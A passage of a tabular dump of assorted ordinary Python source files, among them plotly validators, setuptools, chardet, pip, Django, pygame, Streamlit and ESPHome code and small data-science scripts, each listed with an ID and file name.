    leaking exceptions. If an uncaught exception is raised, the wrapper calls technical_500_response()
    to create a response for django's debug view.

    Runserver_plus overrides the django debug view's technical_500_response() function to allow for
    an enhanced WSGI debugger view to be displayed. However, because Django calls
    convert_exception_to_response() on each object in the stack of Middleware objects, re-raising an
    error quickly pollutes the traceback displayed.

    Runserver_plus only needs needs traceback frames relevant to WSGIHandler Middleware objects, so
    only store the traceback if it is for a WSGIHandler. If an exception is not raised here, Django
    eventually throws an error for not getting a valid response object for its debug view.
    """"""
    try:
        # Store the most recent tb for WSGI requests. The class can be found in the second frame of the tb
        if isinstance(tb.tb_next.tb_frame.f_locals.get('self'), WSGIHandler):
            tld.wsgi_tb = tb
        elif tld.wsgi_tb:
            tb = tld.wsgi_tb
    except AttributeError:
        pass

    try:
        if exc_value is None:
            exc_value = exc_type()
        if exc_value.__traceback__ is not tb:
            raise exc_value.with_traceback(tb)
        raise exc_value
    finally:
        exc_value = None
        tb = None"
JD141	JD141-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""sunburst"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY199	JY199-data_cleaning.py	"""""""Module to clean assignment data""""""
import pandas as pd
from pandas import DataFrame

def clean_data(
    raw_dataframe: DataFrame,
    country: str = 'PT'
):
    """"""
    This function takes the raw data as a pandas dataframe
    and returns the cleaned data as a pandas dataframe

    param: raw_dataframe -> raw data
    param: country -> region to filter data by

    return: clean_dataframe -> clean data
    """"""

    #Unpivot dataframe
    unpivoted_dataframe = pd.melt(raw_dataframe,
                                  id_vars = ['unit','sex','age',""geo""],
                                  var_name = 'year',
                                  value_name = 'value')

    #Set and check data types
    dataframe_correct_dtypes = unpivoted_dataframe
    #Cast year column as integer
    dataframe_correct_dtypes['year'] = dataframe_correct_dtypes['year'].astype('int')
    #Cast value column as float
    dataframe_correct_dtypes['value'] = dataframe_correct_dtypes['value'].str.split(' ').str[0]
    #Deal with null values
    dataframe_correct_dtypes['value'] = dataframe_correct_dtypes['value'].replace({':': -1,
                                                                                   ': ': -1})
    dataframe_correct_dtypes['value'] = dataframe_correct_dtypes['value'].astype('float')
    dataframe_correct_dtypes = dataframe_correct_dtypes[dataframe_correct_dtypes['value'] != -1]
    #Rename columns
    dataframe_correct_dtypes.columns = ['unit', 'sex', 'age', 'region', 'year', 'value']

    #Filter by region
    clean_dataframe = dataframe_correct_dtypes[dataframe_correct_dtypes['region'] == country]

    clean_dataframe = clean_dataframe.reset_index(drop=True)

    clean_dataframe = clean_dataframe.astype({
            'unit':'object',
            'sex':'object',
            'age':'object',
            'region':'object',
            'year':'int64',
            'value':'float64'
            })

    return clean_dataframe"
JY523	JY523-linreg.py	"import numpy

# NOTE: This template makes use of Python classes. If 
# you are not yet familiar with this concept, you can 
# find a short introduction here: 
# http://introtopython.org/classes.html

class LinearRegression():
    """"""
    Linear regression implementation.
    """"""

    def __init__(self):
        
        pass
            
    def fit(self, X, t):
        """"""
        Fits the linear regression model.

        Parameters
        ----------
        X : Array of shape [n_samples, n_features]
        t : Array of shape [n_samples, 1]
        """"""        

        # make sure that we have numpy arrays; also
        # reshape the array X to ensure that we have
        # a multidimensional numpy array (ndarray)
        X = numpy.array(X).reshape((X.shape[0], -1))
        t = numpy.array(t)

        # prepend a column of ones (see page 20, 
        # below equation (1.12))
        ones = numpy.ones((X.shape[0], 1))
        X = numpy.concatenate((ones, X), axis=1)           

        # compute weights via equation (1.16)
        self.w = numpy.linalg.inv((numpy.dot(X.T, X)))
        self.w = numpy.dot(self.w, X.T)
        self.w = numpy.dot(self.w, t)
                
    def predict(self, X):
        """"""
        Computes predictions for a new set of points.

        Parameters
        ----------
        X : Array of shape [n_samples, n_features]

        Returns
        -------
        predictions : Array of shape [n_samples, 1]
        """"""                     

        # make sure that we have numpy arrays; also
        # reshape the array X to ensure that we have
        # a multidimensional numpy array (ndarray)
        X = numpy.array(X).reshape((X.shape[0], -1))

        # prepend a column of ones (see page 20, 
        # below equation (1.12))
        ones = numpy.ones((X.shape[0], 1))
        X = numpy.concatenate((ones, X), axis=1)           

        # compute predictions according to section 1.3.3
        predictions = numpy.dot(X, self.w)

        return predictions
"
JD218	JD218-rotate.py	"from distutils.util import convert_path
from distutils import log
from distutils.errors import DistutilsOptionError
import os
import shutil

from setuptools.extern import six

from setuptools import Command


class rotate(Command):
    """"""Delete older distributions""""""

    description = ""delete older distributions, keeping N newest files""
    user_options = [
        ('match=', 'm', ""patterns to match (required)""),
        ('dist-dir=', 'd', ""directory where the distributions are""),
        ('keep=', 'k', ""number of matching distributions to keep""),
    ]

    boolean_options = []

    def initialize_options(self):
        self.match = None
        self.dist_dir = None
        self.keep = None

    def finalize_options(self):
        if self.match is None:
            raise DistutilsOptionError(
                ""Must specify one or more (comma-separated) match patterns ""
                ""(e.g. '.zip' or '.egg')""
            )
        if self.keep is None:
            raise DistutilsOptionError(""Must specify number of files to keep"")
        try:
            self.keep = int(self.keep)
        except ValueError as e:
            raise DistutilsOptionError(""--keep must be an integer"") from e
        if isinstance(self.match, six.string_types):
            self.match = [
                convert_path(p.strip()) for p in self.match.split(',')
            ]
        self.set_undefined_options('bdist', ('dist_dir', 'dist_dir'))

    def run(self):
        self.run_command(""egg_info"")
        from glob import glob

        for pattern in self.match:
            pattern = self.distribution.get_name() + '*' + pattern
            files = glob(os.path.join(self.dist_dir, pattern))
            files = [(os.path.getmtime(f), f) for f in files]
            files.sort()
            files.reverse()

            log.info(""%d file(s) matching %s"", len(files), pattern)
            files = files[self.keep:]
            for (t, f) in files:
                log.info(""Deleting %s"", f)
                if not self.dry_run:
                    if os.path.isdir(f):
                        shutil.rmtree(f)
                    else:
                        os.unlink(f)"
JD11	JD11-01_Home.py	"import streamlit as st

st.set_page_config(page_title=""shopee.vn"", page_icon="":moneybag:"")
st.title(""Sentiment Analysis"")

# st.markdown(""# Main page"")
st.sidebar.markdown(""# Business Objective"")

st.subheader(""Sentiment Analysis trong E-commerce"")
st.write(""""""
* Ngày nay, nhu cầu mua sắm online ngày càng
cao. Không cần phải đi xa, chúng ta có thể lên
các trang thương mại điện tử để đặt mua mọi
thứ.
"""""")  
st.write(""""""* Để lựa chọn một sản phẩm chúng ta có xu
hướng xem xét những bình luận từ những
người đã mua/ trải nghiệm để đưa ra quyết
định có nên mua hay không?."""""")
st.write(""""""* Những phản hồi của khách hàng rất quan
trọng, từ đó có thể giúp cho nhà cung cấp
cải thiện chất lượng của hàng hóa/ dịch vụ
cũng như thái độ phục vụ nhằm duy trì uy
tín của nhà cung cấp cũng như tìm kiếm
thêm khách hàng mới.
"""""")
st.write(""""""* => Xây dựng hệ thống hỗ trợ phân loại các
phản hồi của khách hàng thành các nhóm:
tích cực, tiêu cực, trung tính dựa trên dữ liệu
dạng văn bản."""""")
st.image(""images/what-is-sentiment-analysis.jpg"")
st.subheader(""Mục tiêu dự án"")
st.image(""images/shopee-1.jpg"")
st.write(""""""* Shopee là một hệ sinh thái
thương mại “all in one”,
trong đó có shopee.vn, là
một website thương mại
điện tử đứng top 1 của Việt
Nam và khu vực Đông
Nam Á."""""")
st.write(""""""* Chúng ta có thể lên đây để xem thông tin sản
phẩm, đánh giá, nhận xét cũng như đặt mua.
            """""")
st.write(""""""* Mục tiêu/ vấn đề: Xây dựng mô hình dự đoán giúp
người bán hàng có thể biết được những phản hồi nhanh
chóng của khách hàng về sản phẩm hay dịch vụ của họ
(tích cực hay tiêu cực), điều này giúp cho người
bán biết được tình hình kinh doanh, hiểu được ý kiến của
khách hàng từ đó giúp họ cải thiện hơn trong dịch vụ, sản
phẩm."""""")"
JY266	JY266-fonty.py	"#!/usr/bin/env python
"""""" pygame.examples.fonty

Here we load a .TTF True Type font file, and display it in
a basic pygame window.

Demonstrating several Font object attributes.

- basic window, event, and font management.
""""""
import pygame as pg


def main():
    # initialize
    pg.init()
    resolution = 400, 200
    screen = pg.display.set_mode(resolution)

    ##    pg.mouse.set_cursor(*pg.cursors.diamond)

    fg = 250, 240, 230
    bg = 5, 5, 5
    wincolor = 40, 40, 90

    # fill background
    screen.fill(wincolor)

    # load font, prepare values
    font = pg.font.Font(None, 80)
    text = ""Fonty""
    size = font.size(text)

    # no AA, no transparency, normal
    ren = font.render(text, 0, fg, bg)
    screen.blit(ren, (10, 10))

    # no AA, transparency, underline
    font.set_underline(1)
    ren = font.render(text, 0, fg)
    screen.blit(ren, (10, 40 + size[1]))
    font.set_underline(0)

    a_sys_font = pg.font.SysFont(""Arial"", 60)

    # AA, no transparency, bold
    a_sys_font.set_bold(1)
    ren = a_sys_font.render(text, 1, fg, bg)
    screen.blit(ren, (30 + size[0], 10))
    a_sys_font.set_bold(0)

    # AA, transparency, italic
    a_sys_font.set_italic(1)
    ren = a_sys_font.render(text, 1, fg)
    screen.blit(ren, (30 + size[0], 40 + size[1]))
    a_sys_font.set_italic(0)

    # Get some metrics.
    print(f""Font metrics for 'Fonty':  {a_sys_font.metrics(text)}"")
    ch = ""\u3060""
    msg = f""Font metrics for '{ch}':  {a_sys_font.metrics(ch)}""
    print(msg)

    ## #some_japanese_unicode = u""\u304b\u3070\u306b""
    ##some_japanese_unicode = unicode_('%c%c%c') % (0x304b, 0x3070, 0x306b)

    # AA, transparency, italic
    ##ren = a_sys_font.render(some_japanese_unicode, 1, fg)
    ##screen.blit(ren, (30 + size[0], 40 + size[1]))

    # show the surface and await user quit
    pg.display.flip()
    while True:
        # use event.wait to keep from polling 100% cpu
        if pg.event.wait().type in (pg.QUIT, pg.KEYDOWN, pg.MOUSEBUTTONDOWN):
            break
    pg.quit()


if __name__ == ""__main__"":
    main()"
JY360	JY360-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""hoverlabel"", parent_name=""histogram2dcontour"", **kwargs
    ):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY316	JY316-conf.py	"# Configuration file for the Sphinx documentation builder.
#
# This file only contains a selection of the most common options. For a full
# list see the documentation:
# https://www.sphinx-doc.org/en/master/usage/configuration.html

# -- Path setup --------------------------------------------------------------

# If extensions (or modules to document with autodoc) are in another directory,
# add these directories to sys.path here. If the directory is relative to the
# documentation root, use os.path.abspath to make it absolute, like shown here.
#
# import os
# import sys
# sys.path.insert(0, os.path.abspath('.'))

# -- Project information -----------------------------------------------------

project = 'moulin'
copyright = '2021-2023, EPAM Systems'
author = 'EPAM Systems'

# The full version, including alpha/beta/rc tags
release = 'v0.13'

# -- General configuration ---------------------------------------------------

# Add any Sphinx extension module names here, as strings. They can be
# extensions coming with Sphinx (named 'sphinx.ext.*') or your custom
# ones.
extensions = []

# Add any paths that contain templates here, relative to this directory.
templates_path = ['_templates']

# List of patterns, relative to source directory, that match files and
# directories to ignore when looking for source files.
# This pattern also affects html_static_path and html_extra_path.
exclude_patterns = ['_build', 'Thumbs.db', '.DS_Store']

# -- Options for HTML output -------------------------------------------------

# The theme to use for HTML and HTML Help pages.  See the documentation for
# a list of builtin themes.
#
html_theme = 'classic'

# Add any paths that contain custom static files (such as style sheets) here,
# relative to this directory. They are copied after the builtin static files,
# so a file named ""default.css"" will overwrite the builtin ""default.css"".
html_static_path = ['_static']"
JD327	JD327-nearline_request_test.py	"# Copyright 2021 Google LLC

# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from datetime import datetime

import backoff
from google.api_core.exceptions import RetryError
from google.cloud.storage import Bucket
from googleapiclient.errors import HttpError

import nearline_request
import nearline_request_apiary


@backoff.on_exception(backoff.expo, (RetryError,), max_time=60)
def test_nearline_request(
        capsys, project_id: str, source_bucket: Bucket,
        destination_bucket: Bucket, job_description_unique: str):

    nearline_request.create_daily_nearline_30_day_migration(
        project_id=project_id,
        description=job_description_unique,
        source_bucket=source_bucket.name,
        sink_bucket=destination_bucket.name,
        start_date=datetime.utcnow()
    )

    out, _ = capsys.readouterr()

    assert ""Created transferJob"" in out


@backoff.on_exception(backoff.expo, (HttpError,), max_time=60)
def test_nearline_request_apiary(
        capsys, project_id: str, source_bucket: Bucket,
        destination_bucket: Bucket, job_description_unique: str):
    nearline_request_apiary.main(
        description=job_description_unique,
        project_id=project_id,
        start_date=datetime.utcnow(),
        start_time=datetime.utcnow(),
        source_bucket=source_bucket.name,
        sink_bucket=destination_bucket.name
    )

    out, _ = capsys.readouterr()

    assert ""Returned transferJob"" in out"
JY345	JY345-__init__.py	"import sys
from typing import TYPE_CHECKING

if sys.version_info < (3, 7) or TYPE_CHECKING:
    from ._ysizemode import YsizemodeValidator
    from ._yref import YrefValidator
    from ._yanchor import YanchorValidator
    from ._y1 import Y1Validator
    from ._y0 import Y0Validator
    from ._xsizemode import XsizemodeValidator
    from ._xref import XrefValidator
    from ._xanchor import XanchorValidator
    from ._x1 import X1Validator
    from ._x0 import X0Validator
    from ._visible import VisibleValidator
    from ._type import TypeValidator
    from ._templateitemname import TemplateitemnameValidator
    from ._path import PathValidator
    from ._opacity import OpacityValidator
    from ._name import NameValidator
    from ._line import LineValidator
    from ._layer import LayerValidator
    from ._fillrule import FillruleValidator
    from ._fillcolor import FillcolorValidator
    from ._editable import EditableValidator
else:
    from _plotly_utils.importers import relative_import

    __all__, __getattr__, __dir__ = relative_import(
        __name__,
        [],
        [
            ""._ysizemode.YsizemodeValidator"",
            ""._yref.YrefValidator"",
            ""._yanchor.YanchorValidator"",
            ""._y1.Y1Validator"",
            ""._y0.Y0Validator"",
            ""._xsizemode.XsizemodeValidator"",
            ""._xref.XrefValidator"",
            ""._xanchor.XanchorValidator"",
            ""._x1.X1Validator"",
            ""._x0.X0Validator"",
            ""._visible.VisibleValidator"",
            ""._type.TypeValidator"",
            ""._templateitemname.TemplateitemnameValidator"",
            ""._path.PathValidator"",
            ""._opacity.OpacityValidator"",
            ""._name.NameValidator"",
            ""._line.LineValidator"",
            ""._layer.LayerValidator"",
            ""._fillrule.FillruleValidator"",
            ""._fillcolor.FillcolorValidator"",
            ""._editable.EditableValidator"",
        ],
    )"
JY9	JY9-johabprober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import JOHABDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import JOHAB_SM_MODEL


class JOHABProber(MultiByteCharSetProber):
    def __init__(self) -> None:
        super().__init__()
        self.coding_sm = CodingStateMachine(JOHAB_SM_MODEL)
        self.distribution_analyzer = JOHABDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self) -> str:
        return ""Johab""

    @property
    def language(self) -> str:
        return ""Korean"""
JY2	JY2-proactivizer.py	"#Background Proactivization

import threading
import random
import time
import IntegrationRSA

global n
global import_shares

global additive_shares

def additive_sharing(p,m,g):
    '''Employs additive sharing to divide a secret 'm' into 'p' shares
    g (=0 or 1) indicates whether or not the global shares are to be updated '''

    global additive_shares
    global n
    
    additive_shares_new = []
    
    for i in range(p-1):
        additive_shares_new.append(random.randrange(0,m+1))     #FIX to pick values 0 to m and roll around with modulo

    s = m - sum(additive_shares_new)

    while s < 0: s += n
    
    additive_shares_new.append(s)

    if g == 1:      #if argument g=1, additive sharing is in global scope
        additive_shares = additive_shares_new
        return
    else:           #if argument g=0, additive sharing is for locally generating an additive sharing set
        return additive_shares_new


def background(f): #Runs function under @background in the background
    '''
    a threading decorator
    use @background above the function you want to run in the background
    '''
    def backgrnd_func(*a, **kw):
        threading.Thread(target=f, args=a, kwargs=kw).start()
    return backgrnd_func


def timed_function(input_shares,f):
    '''Refreshes all shares in list old_shares,share field size is f'''

    global import_shares
    
    old_shares = import_shares
    n = len(old_shares)
    new_shares = [0 for _ in range(n)]
    for i in old_shares:
        share_div = additive_sharing(n,i,0)
        new_shares = [(a+b)%f for a,b in zip(new_shares,share_div)]
    import_shares = new_shares
    IntegrationRSA.additive_shares = import_shares
    print(""REFRESHED!:"",import_shares)

@background

def proactive_timer(inp_shares,f):
    '''f is field size for shares == n = p.q'''
    global n
    global import_shares
    n = f
    import_shares = inp_shares
    while True:
        timed_function(inp_shares,f)
        time.sleep(1)  #Shares refreshed every 3 seconds





"
JD215	JD215-mbcsgroupprober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is Mozilla Universal charset detector code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 2001
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#   Shy Shalom - original C code
#   Proofpoint, Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .big5prober import Big5Prober
from .charsetgroupprober import CharSetGroupProber
from .cp949prober import CP949Prober
from .eucjpprober import EUCJPProber
from .euckrprober import EUCKRProber
from .euctwprober import EUCTWProber
from .gb2312prober import GB2312Prober
from .johabprober import JOHABProber
from .sjisprober import SJISProber
from .utf8prober import UTF8Prober


class MBCSGroupProber(CharSetGroupProber):
    def __init__(self, lang_filter=None):
        super().__init__(lang_filter=lang_filter)
        self.probers = [
            UTF8Prober(),
            SJISProber(),
            EUCJPProber(),
            GB2312Prober(),
            EUCKRProber(),
            CP949Prober(),
            Big5Prober(),
            EUCTWProber(),
            JOHABProber(),
        ]
        self.reset()"
JY176	JY176-test_heartbeat.py	"""""""Tests for heartbeat thread""""""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

import errno
from unittest.mock import patch

import pytest
import zmq

from ipykernel.heartbeat import Heartbeat


def test_port_bind_failure_raises():
    heart = Heartbeat(None)
    with patch.object(heart, ""_try_bind_socket"") as mock_try_bind:
        mock_try_bind.side_effect = zmq.ZMQError(-100, ""fails for unknown error types"")
        with pytest.raises(zmq.ZMQError):
            heart._bind_socket()
        assert mock_try_bind.call_count == 1


def test_port_bind_success():
    heart = Heartbeat(None)
    with patch.object(heart, ""_try_bind_socket"") as mock_try_bind:
        heart._bind_socket()
        assert mock_try_bind.call_count == 1


def test_port_bind_failure_recovery():
    try:
        errno.WSAEADDRINUSE
    except AttributeError:
        # Fake windows address in-use code
        errno.WSAEADDRINUSE = 12345

    try:
        heart = Heartbeat(None)
        with patch.object(heart, ""_try_bind_socket"") as mock_try_bind:
            mock_try_bind.side_effect = [
                zmq.ZMQError(errno.EADDRINUSE, ""fails for non-bind unix""),
                zmq.ZMQError(errno.WSAEADDRINUSE, ""fails for non-bind windows""),
            ] + [0] * 100
            # Shouldn't raise anything as retries will kick in
            heart._bind_socket()
    finally:
        # Cleanup fake assignment
        if errno.WSAEADDRINUSE == 12345:
            del errno.WSAEADDRINUSE


def test_port_bind_failure_gives_up_retries():
    heart = Heartbeat(None)
    with patch.object(heart, ""_try_bind_socket"") as mock_try_bind:
        mock_try_bind.side_effect = zmq.ZMQError(errno.EADDRINUSE, ""fails for non-bind"")
        with pytest.raises(zmq.ZMQError):
            heart._bind_socket()
        assert mock_try_bind.call_count == 100"
JD453	JD453-failure.py	"#!/usr/bin/env python

# Copyright 2016 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import logging

from google.appengine.api import memcache
import webapp2


def read_from_persistent_store():
    """"""Fake method for demonstration purposes. Usually would return
     a value from a database like Cloud Datastore or MySQL.""""""
    return ""a persistent value""


class ReadPage(webapp2.RequestHandler):
    def get(self):
        key = ""some-key""
        # [START memcache-read]
        v = memcache.get(key)
        if v is None:
            v = read_from_persistent_store()
            memcache.add(key, v)
        # [END memcache-read]

        self.response.content_type = 'text/html'
        self.response.write(str(v))


class DeletePage(webapp2.RequestHandler):
    def get(self):
        key = ""some key""
        seconds = 5
        memcache.set(key, ""some value"")
        # [START memcache-delete]
        memcache.delete(key, seconds)  # clears cache
        # write to persistent datastore
        # Do not attempt to put new value in cache, first reader will do that
        # [END memcache-delete]
        self.response.content_type = 'text/html'
        self.response.write('done')


class MainPage(webapp2.RequestHandler):
    def get(self):
        value = 3
        # [START memcache-failure]
        if not memcache.set('counter', value):
            logging.error(""Memcache set failed"")
            # Other error handling here
        # [END memcache-failure]
        self.response.content_type = 'text/html'
        self.response.write('done')


app = webapp2.WSGIApplication([
    ('/', MainPage),
    ('/delete', DeletePage),
    ('/read', ReadPage),
], debug=True)"
JD121	JD121-log.py	"from django import template
from django.contrib.admin.models import LogEntry

register = template.Library()


class AdminLogNode(template.Node):
    def __init__(self, limit, varname, user):
        self.limit, self.varname, self.user = limit, varname, user

    def __repr__(self):
        return ""<GetAdminLog Node>""

    def render(self, context):
        if self.user is None:
            entries = LogEntry.objects.all()
        else:
            user_id = self.user
            if not user_id.isdigit():
                user_id = context[self.user].pk
            entries = LogEntry.objects.filter(user__pk=user_id)
        context[self.varname] = entries.select_related('content_type', 'user')[:int(self.limit)]
        return ''


@register.tag
def get_admin_log(parser, token):
    """"""
    Populate a template variable with the admin log for the given criteria.

    Usage::

        {% get_admin_log [limit] as [varname] for_user [context_var_containing_user_obj] %}

    Examples::

        {% get_admin_log 10 as admin_log for_user 23 %}
        {% get_admin_log 10 as admin_log for_user user %}
        {% get_admin_log 10 as admin_log %}

    Note that ``context_var_containing_user_obj`` can be a hard-coded integer
    (user ID) or the name of a template context variable containing the user
    object whose ID you want.
    """"""
    tokens = token.contents.split()
    if len(tokens) < 4:
        raise template.TemplateSyntaxError(
            ""'get_admin_log' statements require two arguments"")
    if not tokens[1].isdigit():
        raise template.TemplateSyntaxError(
            ""First argument to 'get_admin_log' must be an integer"")
    if tokens[2] != 'as':
        raise template.TemplateSyntaxError(
            ""Second argument to 'get_admin_log' must be 'as'"")
    if len(tokens) > 4:
        if tokens[4] != 'for_user':
            raise template.TemplateSyntaxError(
                ""Fourth argument to 'get_admin_log' must be 'for_user'"")
    return AdminLogNode(limit=tokens[1], varname=tokens[3], user=(tokens[5] if len(tokens) > 5 else None))"
JY514	JY514-light.py	"import esphome.codegen as cg
import esphome.config_validation as cv
from esphome import pins
from esphome.components import fastled_base
from esphome.const import (
    CONF_CHIPSET,
    CONF_CLOCK_PIN,
    CONF_DATA_PIN,
    CONF_DATA_RATE,
    CONF_NUM_LEDS,
    CONF_RGB_ORDER,
)

AUTO_LOAD = [""fastled_base""]

CHIPSETS = [
    ""LPD8806"",
    ""WS2801"",
    ""WS2803"",
    ""SM16716"",
    ""P9813"",
    ""APA102"",
    ""SK9822"",
    ""DOTSTAR"",
]

CONFIG_SCHEMA = cv.All(
    fastled_base.BASE_SCHEMA.extend(
        {
            cv.Required(CONF_CHIPSET): cv.one_of(*CHIPSETS, upper=True),
            cv.Required(CONF_DATA_PIN): pins.internal_gpio_output_pin_number,
            cv.Required(CONF_CLOCK_PIN): pins.internal_gpio_output_pin_number,
            cv.Optional(CONF_DATA_RATE): cv.frequency,
        }
    ),
    cv.require_framework_version(
        esp8266_arduino=cv.Version(2, 7, 4),
        esp32_arduino=cv.Version(99, 0, 0),
        max_version=True,
        extra_message=""Please see note on documentation for FastLED"",
    ),
)


async def to_code(config):
    var = await fastled_base.new_fastled_light(config)

    rgb_order = cg.RawExpression(
        config[CONF_RGB_ORDER] if CONF_RGB_ORDER in config else ""RGB""
    )
    data_rate = None

    if CONF_DATA_RATE in config:
        data_rate_khz = int(config[CONF_DATA_RATE] / 1000)
        if data_rate_khz < 1000:
            data_rate = cg.RawExpression(f""DATA_RATE_KHZ({data_rate_khz})"")
        else:
            data_rate_mhz = int(data_rate_khz / 1000)
            data_rate = cg.RawExpression(f""DATA_RATE_MHZ({data_rate_mhz})"")
    template_args = cg.TemplateArguments(
        cg.RawExpression(config[CONF_CHIPSET]),
        config[CONF_DATA_PIN],
        config[CONF_CLOCK_PIN],
        rgb_order,
        data_rate,
    )
    cg.add(var.add_leds(template_args, config[CONF_NUM_LEDS]))"
JD217	JD217-xmlrpc.py	"""""""xmlrpclib.Transport implementation
""""""

import logging

# NOTE: XMLRPC Client is not annotated in typeshed as on 2017-07-17, which is
#       why we ignore the type on this import
from pip._vendor.six.moves import xmlrpc_client  # type: ignore
from pip._vendor.six.moves.urllib import parse as urllib_parse

from pip._internal.exceptions import NetworkConnectionError
from pip._internal.network.utils import raise_for_status
from pip._internal.utils.typing import MYPY_CHECK_RUNNING

if MYPY_CHECK_RUNNING:
    from typing import Dict
    from pip._internal.network.session import PipSession


logger = logging.getLogger(__name__)


class PipXmlrpcTransport(xmlrpc_client.Transport):
    """"""Provide a `xmlrpclib.Transport` implementation via a `PipSession`
    object.
    """"""

    def __init__(self, index_url, session, use_datetime=False):
        # type: (str, PipSession, bool) -> None
        xmlrpc_client.Transport.__init__(self, use_datetime)
        index_parts = urllib_parse.urlparse(index_url)
        self._scheme = index_parts.scheme
        self._session = session

    def request(self, host, handler, request_body, verbose=False):
        # type: (str, str, Dict[str, str], bool) -> None
        parts = (self._scheme, host, handler, None, None, None)
        url = urllib_parse.urlunparse(parts)
        try:
            headers = {'Content-Type': 'text/xml'}
            response = self._session.post(url, data=request_body,
                                          headers=headers, stream=True)
            raise_for_status(response)
            self.verbose = verbose
            return self.parse_response(response.raw)
        except NetworkConnectionError as exc:
            assert exc.response
            logger.critical(
                ""HTTP error %s while getting %s"",
                exc.response.status_code, url,
            )
            raise"
JD255	JD255-onu_selftest_failure_alarm.py	"# Copyright 2018 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
